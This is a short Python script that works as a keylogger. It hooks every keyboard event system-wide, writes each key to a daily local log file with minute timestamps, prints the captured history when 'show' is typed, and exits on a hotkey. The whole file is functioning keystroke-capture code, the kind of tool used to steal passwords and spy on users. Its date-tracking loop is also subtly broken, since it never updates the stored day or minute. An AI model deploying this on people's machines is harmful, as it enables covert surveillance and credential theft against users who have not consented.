import keyboard
import datetime
import time
import os

keylog = ""  # log of the actions
file_name = ""


def get_time():
    # func to get the current time and returns list [MM/DD/YY,HH:MM,HH,MM,YYYY,MM,DD]
    x = datetime.datetime.now()
    return [x.strftime("%x"), x.strftime("%H"), x.strftime("%M"), x.strftime("%Y"), x.strftime("%m"), x.strftime("%d")]


def create_file():
    # creates a now file every day and sets the var file_name to the up-to-date day
    global file_name
    current_time = get_time()
    file_name = f"keylog{current_time[3]}_{current_time[4]}_{current_time[5]}.txt"
    file = open(file_name, "w")
    file.write(f"{current_time[0]}")
    file.close()


def log_key_event(event):
    # activated on every keyboard action sending the key pressed to be added to file
    if event.event_type == keyboard.KEY_DOWN:
        global keylog
        keylog += event.name
        save_to_file(event.name)
        show(keylog)


def save_to_file(key):
    # adds input to the keylog file
    file = open(file_name, "a")
    file.write(f"{key}")
    file.close()


def time_control(time_list):
    # adds every minute a new line the file with the time & date info
    global keylog
    z: str = f"\n******{time_list[0]} {time_list[1]}:{time_list[2]}******\n"
    keylog += z
    save_to_file(z)


def detect_date_change():
    # monitors time & date
    date_and_time = get_time()
    day, minute = date_and_time[5], date_and_time[2]
    create_file()
    time_control(date_and_time)
    while True:
        new_date_and_time = get_time()
        new_day, new_minute = new_date_and_time[5], new_date_and_time[2]
        if new_day != day:
            # if next day create new file
            create_file()
        elif new_minute != minute:
            # if next minute create new line in file
            time_control(new_date_and_time)
        time.sleep(60)


def show(log):
    # print typed history if user types "show"
    if "show" in log:
        log_list = log.split("show")
        if not log_list[-1]:
            print(log_list[-2])


def terminator():
    # exits program
    print("terminating code")
    os._exit(1)


# activates terminator() if user clicks on ctrl+shift+z
keyboard.add_hotkey('ctrl+shift+z', lambda: terminator())
# listens to keyboard events and activates log_key_event()
keyboard.hook(lambda e: log_key_event(e))
# creates a log file
detect_date_change()
